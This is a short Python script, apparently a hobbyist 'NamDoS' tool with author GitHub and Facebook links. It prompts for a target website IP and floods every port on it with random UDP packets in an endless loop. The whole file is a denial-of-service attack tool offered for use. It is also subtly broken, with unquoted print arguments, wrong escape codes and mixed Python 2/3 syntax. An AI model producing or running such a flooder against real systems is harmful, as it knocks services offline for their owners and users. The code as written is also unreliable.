import socket
import os
import random
import time

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)

os.system("clear")
def logo():
  logo = """
  _   _                       _____             _____ 
 | \ | |                     |  __ \           / ____|
 |  \| |   __ _   _ __ ___   | |  | |   ___   | (___  
 | . ` |  / _` | | '_ ` _ \  | |  | |  / _ \   \___ \ 
 | |\  | | (_| | | | | | | | | |__| | | (_) |  ____) |
 |_| \_|  \__,_| |_| |_| |_| |_____/   \___/  |_____/ "                                                                     "                                                                                                                           "

============================================================
+Github      : https://github.com/Lozllll
+Facebook    : https://facebook.com/hoangnamtricker.2009
============================================================
"""
  print (logo)

ip = raw_input("[+] >>IP WEBSITE YOU WANT ATTACK: ")
os.system("clear")
print (ATTACKING...)
time.sleep(3)
while True:
	sent = 0
	for port in range(1, 65534):
    		white.sendto(bytes, (ip,port))
    		sent = sent + 1
    		print "\032[1;91mSend \032[1;32m%s \032[1;91m Packets to \032[1;32m%s \032[1;91mThrough port \032[1;32m%s "%(sent, ip, port)

print (DONE!)
